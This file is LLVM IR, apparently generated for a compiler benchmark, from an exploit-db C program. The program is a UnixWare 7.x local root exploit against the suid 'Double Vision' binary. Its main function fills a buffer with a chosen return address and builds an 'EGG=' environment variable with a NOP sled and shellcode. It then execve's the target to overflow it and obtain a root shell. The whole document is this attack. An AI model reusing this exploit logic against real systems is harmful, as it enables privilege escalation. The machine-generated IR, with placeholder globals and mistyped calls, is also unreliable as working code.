; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/sco/local/extr_20230.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/sco/local/extr_20230.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@stdout = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [7 x i8] c"a:r:l:\00", align 1
@EOF = common dso_local global i32 0, align 4
@optarg = common dso_local global i32 0, align 4
@addr = common dso_local global i32 0, align 4
@optind = common dso_local global i32 0, align 4
@exefile = common dso_local global i8* null, align 8
@.str.1 = private unnamed_addr constant [50 x i8] c"UnixWare 7.x exploit for suid root Double Vision\0A\00", align 1
@.str.2 = private unnamed_addr constant [36 x i8] c"Stephen Friedl <steve@unixwiz.net>\0A\00", align 1
@.str.3 = private unnamed_addr constant [29 x i8] c"Using addr=0x%x   retlen=%d\0A\00", align 1
@.str.4 = private unnamed_addr constant [29 x i8] c"ERROR: retlen can't be > %d\0A\00", align 1
@.str.5 = private unnamed_addr constant [45 x i8] c"ERROR: ret address 0x%08lx has a zero byte!\0A\00", align 1
@.str.6 = private unnamed_addr constant [5 x i8] c"XXXX\00", align 1
@.str.7 = private unnamed_addr constant [21 x i8] c"strlen(retbuf) = %d\0A\00", align 1
@NOP = common dso_local global i32 0, align 4
@.str.8 = private unnamed_addr constant [5 x i8] c"EGG=\00", align 1
@scoshell = common dso_local global i8* null, align 8
@arg = common dso_local global i8** null, align 8
@.str.9 = private unnamed_addr constant [10 x i8] c"dvexploit\00", align 1
@env = common dso_local global i8** null, align 8

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca [1024 x i8], align 16
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca [5000 x i8], align 16
  %12 = alloca i32, align 4
  %13 = alloca i8*, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i32 1023, i32* %9, align 4
  store i32 2048, i32* %10, align 4
  store i32 0, i32* %12, align 4
  %14 = load i32, i32* @stdout, align 4
  %15 = call i32 @setbuf(i32 %14, i8* null)
  br label %16

16:                                               ; preds = %33, %2
  %17 = load i32, i32* %4, align 4
  %18 = load i8**, i8*** %5, align 8
  %19 = call i32 @getopt(i32 %17, i8** %18, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str, i64 0, i64 0))
  store i32 %19, i32* %6, align 4
  %20 = load i32, i32* @EOF, align 4
  %21 = icmp ne i32 %19, %20
  br i1 %21, label %22, label %34

22:                                               ; preds = %16
  %23 = load i32, i32* %6, align 4
  switch i32 %23, label %33 [
    i32 97, label %24
    i32 108, label %27
    i32 114, label %30
  ]

24:                                               ; preds = %22
  %25 = load i32, i32* @optarg, align 4
  %26 = call i32 @strtol(i32 %25, i32 0, i32 16)
  store i32 %26, i32* @addr, align 4
  br label %33

27:                                               ; preds = %22
  %28 = load i32, i32* @optarg, align 4
  %29 = call i32 @atoi(i32 %28)
  store i32 %29, i32* %12, align 4
  br label %33

30:                                               ; preds = %22
  %31 = load i32, i32* @optarg, align 4
  %32 = call i32 @atoi(i32 %31)
  store i32 %32, i32* %10, align 4
  br label %33

33:                                               ; preds = %22, %30, %27, %24
  br label %16

34:                                               ; preds = %16
  %35 = load i32, i32* @optind, align 4
  %36 = load i32, i32* %4, align 4
  %37 = icmp slt i32 %35, %36
  br i1 %37, label %38, label %45

38:                                               ; preds = %34
  %39 = load i8**, i8*** %5, align 8
  %40 = load i32, i32* @optind, align 4
  %41 = add nsw i32 %40, 1
  store i32 %41, i32* @optind, align 4
  %42 = sext i32 %40 to i64
  %43 = getelementptr inbounds i8*, i8** %39, i64 %42
  %44 = load i8*, i8** %43, align 8
  store i8* %44, i8** @exefile, align 8
  br label %45

45:                                               ; preds = %38, %34
  %46 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([50 x i8], [50 x i8]* @.str.1, i64 0, i64 0))
  %47 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str.2, i64 0, i64 0))
  %48 = load i32, i32* @addr, align 4
  %49 = load i32, i32* %10, align 4
  %50 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.3, i64 0, i64 0), i32 %48, i32 %49)
  %51 = load i32, i32* %10, align 4
  %52 = sext i32 %51 to i64
  %53 = icmp ugt i64 %52, 5000
  br i1 %53, label %54, label %57

54:                                               ; preds = %45
  %55 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.4, i64 0, i64 0), i64 4)
  %56 = call i32 @exit(i32 1) #3
  unreachable

57:                                               ; preds = %45
  store i8* bitcast (i32* @addr to i8*), i8** %13, align 8
  %58 = load i8*, i8** %13, align 8
  %59 = getelementptr inbounds i8, i8* %58, i64 0
  %60 = load i8, i8* %59, align 1
  %61 = icmp ne i8 %60, 0
  br i1 %61, label %62, label %77

62:                                               ; preds = %57
  %63 = load i8*, i8** %13, align 8
  %64 = getelementptr inbounds i8, i8* %63, i64 1
  %65 = load i8, i8* %64, align 1
  %66 = icmp ne i8 %65, 0
  br i1 %66, label %67, label %77

67:                                               ; preds = %62
  %68 = load i8*, i8** %13, align 8
  %69 = getelementptr inbounds i8, i8* %68, i64 2
  %70 = load i8, i8* %69, align 1
  %71 = icmp ne i8 %70, 0
  br i1 %71, label %72, label %77

72:                                               ; preds = %67
  %73 = load i8*, i8** %13, align 8
  %74 = getelementptr inbounds i8, i8* %73, i64 3
  %75 = load i8, i8* %74, align 1
  %76 = icmp ne i8 %75, 0
  br i1 %76, label %81, label %77

77:                                               ; preds = %72, %67, %62, %57
  %78 = load i32, i32* @addr, align 4
  %79 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([45 x i8], [45 x i8]* @.str.5, i64 0, i64 0), i32 %78)
  %80 = call i32 @exit(i32 1) #3
  unreachable

81:                                               ; preds = %72
  %82 = bitcast [5000 x i8]* %11 to i8**
  %83 = call i32 @strcpy(i8** %82, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.6, i64 0, i64 0))
  %84 = load i32, i32* %12, align 4
  store i32 %84, i32* %7, align 4
  br label %85

85:                                               ; preds = %96, %81
  %86 = load i32, i32* %7, align 4
  %87 = load i32, i32* %10, align 4
  %88 = sub nsw i32 %87, 4
  %89 = icmp slt i32 %86, %88
  br i1 %89, label %90, label %99

90:                                               ; preds = %85
  %91 = getelementptr inbounds [5000 x i8], [5000 x i8]* %11, i64 0, i64 0
  %92 = load i32, i32* %7, align 4
  %93 = sext i32 %92 to i64
  %94 = getelementptr inbounds i8, i8* %91, i64 %93
  %95 = call i32 (i8*, ...) @memcpy(i8* %94, i32* @addr, i32 4)
  br label %96

96:                                               ; preds = %90
  %97 = load i32, i32* %7, align 4
  %98 = add nsw i32 %97, 4
  store i32 %98, i32* %7, align 4
  br label %85

99:                                               ; preds = %85
  %100 = load i32, i32* %7, align 4
  %101 = sext i32 %100 to i64
  %102 = getelementptr inbounds [5000 x i8], [5000 x i8]* %11, i64 0, i64 %101
  store i8 0, i8* %102, align 1
  %103 = getelementptr inbounds [5000 x i8], [5000 x i8]* %11, i64 0, i64 0
  %104 = call i32 @strlen(i8* %103)
  %105 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.7, i64 0, i64 0), i32 %104)
  %106 = getelementptr inbounds [1024 x i8], [1024 x i8]* %8, i64 0, i64 0
  %107 = load i32, i32* @NOP, align 4
  %108 = load i32, i32* %9, align 4
  %109 = call i32 @memset(i8* %106, i32 %107, i32 %108)
  %110 = getelementptr inbounds [1024 x i8], [1024 x i8]* %8, i64 0, i64 0
  %111 = call i32 (i8*, ...) @memcpy(i8* %110, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.8, i64 0, i64 0), i32 4)
  %112 = getelementptr inbounds [1024 x i8], [1024 x i8]* %8, i64 0, i64 0
  %113 = load i32, i32* %9, align 4
  %114 = load i8*, i8** @scoshell, align 8
  %115 = call i32 @strlen(i8* %114)
  %116 = sub nsw i32 %113, %115
  %117 = sub nsw i32 %116, 1
  %118 = sext i32 %117 to i64
  %119 = getelementptr inbounds i8, i8* %112, i64 %118
  %120 = load i8*, i8** @scoshell, align 8
  %121 = load i8*, i8** @scoshell, align 8
  %122 = call i32 @strlen(i8* %121)
  %123 = call i32 (i8*, ...) @memcpy(i8* %119, i8* %120, i32 %122)
  %124 = load i32, i32* %9, align 4
  %125 = sext i32 %124 to i64
  %126 = getelementptr inbounds [1024 x i8], [1024 x i8]* %8, i64 0, i64 %125
  store i8 0, i8* %126, align 1
  %127 = load i8*, i8** @exefile, align 8
  %128 = load i8**, i8*** @arg, align 8
  %129 = getelementptr inbounds i8*, i8** %128, i64 0
  store i8* %127, i8** %129, align 8
  %130 = load i8**, i8*** @arg, align 8
  %131 = getelementptr inbounds i8*, i8** %130, i64 1
  store i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.9, i64 0, i64 0), i8** %131, align 8
  %132 = getelementptr inbounds [5000 x i8], [5000 x i8]* %11, i64 0, i64 0
  %133 = load i8**, i8*** @arg, align 8
  %134 = getelementptr inbounds i8*, i8** %133, i64 2
  store i8* %132, i8** %134, align 8
  %135 = load i8**, i8*** @arg, align 8
  %136 = getelementptr inbounds i8*, i8** %135, i64 3
  store i8* null, i8** %136, align 8
  %137 = getelementptr inbounds [1024 x i8], [1024 x i8]* %8, i64 0, i64 0
  %138 = load i8**, i8*** @env, align 8
  %139 = getelementptr inbounds i8*, i8** %138, i64 0
  store i8* %137, i8** %139, align 8
  %140 = load i8**, i8*** @env, align 8
  %141 = getelementptr inbounds i8*, i8** %140, i64 1
  store i8* null, i8** %141, align 8
  %142 = load i8**, i8*** @arg, align 8
  %143 = getelementptr inbounds i8*, i8** %142, i64 0
  %144 = load i8*, i8** %143, align 8
  %145 = load i8**, i8*** @arg, align 8
  %146 = load i8**, i8*** @env, align 8
  %147 = call i32 @execve(i8* %144, i8** %145, i8** %146)
  %148 = load i32, i32* %3, align 4
  ret i32 %148
}

declare dso_local i32 @setbuf(i32, i8*) #1

declare dso_local i32 @getopt(i32, i8**, i8*) #1

declare dso_local i32 @strtol(i32, i32, i32) #1

declare dso_local i32 @atoi(i32) #1

declare dso_local i32 @printf(i8*, ...) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @strcpy(i8**, i8*) #1

declare dso_local i32 @memcpy(i8*, ...) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @memset(i8*, i32, i32) #1

declare dso_local i32 @execve(i8*, i8**, i8**) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
